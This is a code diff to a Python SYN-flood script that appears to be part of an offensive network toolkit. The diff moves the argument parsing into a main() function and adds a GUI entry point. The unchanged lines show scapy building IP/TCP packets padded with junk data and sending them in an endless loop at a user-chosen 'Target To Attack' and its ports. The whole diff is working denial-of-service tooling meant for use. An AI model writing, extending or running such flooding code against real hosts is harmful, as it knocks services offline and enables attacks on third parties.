@@ -91,6 +91,9 @@ class SynFlood:
         packet = ip / tcp / trash_data
         send(packet,verbose=1,loop=1)
 
+def run_from_gui(argument_values):
+    syn_flood = SynFlood(target=argument_values['target'] ,ports=argument_values['port'])
+    syn_flood.start()
 
 def print_parser_help():
     help_text = '''
@@ -101,21 +104,21 @@ optional arguments:
     '''
     print(help_text)
 
+def main():
+    parser = ArgumentParser(usage='sudo python3 %(prog)s --script syn_flood.py [--script-help or -sh for help] [--target TARGET] [--port PORT(S)]',allow_abbrev=False)
+    parser.add_argument('--script-help', '-sh', help='Show Script Help', action='store_true')
+    parser.add_argument('--target','-t', help='Target To Attack', metavar='')
+    parser.add_argument('--port','-p',help='Port Numbers To Attack', metavar='x,y,z')
+    args, unknown = parser.parse_known_args()
 
-parser = ArgumentParser(usage='sudo python3 %(prog)s --script syn_flood.py [--script-help or -sh for help] [--target TARGET] [--port PORT(S)]',allow_abbrev=False)
-parser.add_argument('--script-help', '-sh', help='Show Script Help', action='store_true')
-parser.add_argument('--target','-t', help='Target To Attack', metavar='')
-parser.add_argument('--port','-p',help='Port Numbers To Attack', metavar='x,y,z')
-args, unknown = parser.parse_known_args()
+    if ((args.script_help is not None) and (args.script_help is True)):
+        print_parser_help()
 
-if ((args.script_help is not None) and (args.script_help is True)):
-    print_parser_help()
+    if ((args.target != None) and (args.port != None)):
+        pass
+    else:
+        parser.print_usage()
+        exit()
 
-if ((args.target != None) and (args.port != None)):
-    pass
-else:
-    parser.print_usage()
-    exit()
-
-syn_flood = SynFlood(args.target,args.port)
-syn_flood.start()
+    syn_flood = SynFlood(args.target,args.port)
+    syn_flood.start()
